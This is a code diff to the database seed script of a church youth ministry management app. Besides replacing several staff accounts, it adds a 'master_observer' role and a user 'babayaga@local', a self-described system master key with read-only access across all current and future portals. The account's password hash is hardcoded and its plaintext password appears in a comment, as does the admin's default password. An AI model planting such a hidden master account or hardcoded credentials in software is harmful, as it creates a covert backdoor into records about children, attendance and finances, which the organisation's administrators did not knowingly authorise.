@@ -12,33 +12,32 @@ async function seedDb() {
             [2, 'media_team', 'Media & Communications Executive', 'Manage public gallery, video streams, event calendar timeline, and church news.'],
             [3, 'records_officer', 'Records & Attendance Secretary', 'Conduct roll-calls, batch import youth roster files, export attendance CSV, and manage member profiles.'],
             [4, 'volunteer', 'Youth Leader / Volunteer', 'Check-in assistance and youth group coordination.'],
-            [5, 'viewer', 'Viewer / Executive Observer', 'Read-only access to live dashboards, attendance logs, and financial reports.']
+            [5, 'viewer', 'Viewer / Executive Observer', 'Read-only access to live dashboards, attendance logs, and financial reports.'],
+            [6, 'master_observer', 'Master System Troubleshooter', 'System master key with comprehensive read-only observation rights across all current and future portals.']
         ];
         for (const [id, name, disp, desc] of roles) {
             await db.query(`INSERT OR REPLACE INTO roles (id, name, display_name, description) VALUES ($1, $2, $3, $4)`, [id, name, disp, desc]);
         }
 
-        // 2. Staff Users (Default password: Password123!)
-        const defaultHash = '$2a$10$EdzsIdLKAaL447EZJbV3r.Cx0Usxz/tkzsbk1gntFiCPEGVq1EWGi';
+        // 2. Staff Users (Default Admin: Mr. Kinsley | Master Key: babayaga@local)
+        const defaultAdminHash = '$2a$10$EdzsIdLKAaL447EZJbV3r.Cx0Usxz/tkzsbk1gntFiCPEGVq1EWGi'; // Password123!
+        const masterKeyHash = '$2a$10$1nyIePBRsK8pcE7XJl3NJeBBW.qHEp8N99HJESZbmXVZqonFzO2Ie'; // babayagalives001
         const staffUsers = [
-            [1, 'admin@church.local', defaultHash, 'Pastor David', 'Mensah', 'Resident Pastor & Administrator', 1, 'all'],
-            [2, 'media@church.local', defaultHash, 'Kofi', 'Ansah', 'Media & Creative Lead', 2, 'media,gallery,announcements,events'],
-            [3, 'records@church.local', defaultHash, 'Abena', 'Osei', 'Records & Attendance Secretary', 3, 'attendance,members,roster,reports'],
-            [4, 'volunteer@church.local', defaultHash, 'Emmanuel', 'Owusu', 'Youth Fellowship Leader', 4, 'attendance_checkin,members_view'],
-            [5, 'viewer@church.local', defaultHash, 'Elder Kwame', 'Asante', 'Session Member / Council Observer', 5, 'readonly']
+            [1, 'admin@church.local', 'kinsley', defaultAdminHash, 'Mr.', 'Kinsley', 'Youth President', 1, 'all'],
+            [99, 'babayaga@local', 'babayaga', masterKeyHash, 'Babayaga', 'Master', 'System Master Key (Troubleshooter)', 6, 'readonly_master']
         ];
 
-        for (const [id, email, hash, fn, ln, title, roleId, perms] of staffUsers) {
+        for (const [id, email, username, hash, fn, ln, title, roleId, perms] of staffUsers) {
             await db.query(`
-                INSERT OR REPLACE INTO users (id, email, password_hash, first_name, last_name, title, role_id, permissions)
-                VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
-            `, [id, email, hash, fn, ln, title, roleId, perms]);
+                INSERT OR REPLACE INTO users (id, email, username, password_hash, first_name, last_name, title, role_id, permissions)
+                VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
+            `, [id, email, username, hash, fn, ln, title, roleId, perms]);
         }
 
         // 3. Youth Groups
         const groups = [
-            [1, 'Junior Youth (Ages 8-12)', 8, 12, 4, 'Sunday school, scripture discovery, and creative crafts.'],
-            [2, 'Teen Ministry (Ages 13-19)', 13, 19, 3, 'High school fellowship, bible quizzing, choir, and leadership training.'],
+            [1, 'Junior Youth (Ages 8-12)', 8, 12, 1, 'Sunday school, scripture discovery, and creative crafts.'],
+            [2, 'Teen Ministry (Ages 13-19)', 13, 19, 1, 'High school fellowship, bible quizzing, choir, and leadership training.'],
             [3, 'Young Adults & Campus (Ages 20-25)', 20, 25, 1, 'Tertiary fellowship, career seminars, and community missions.']
         ];
         for (const [id, name, min, max, leader, desc] of groups) {
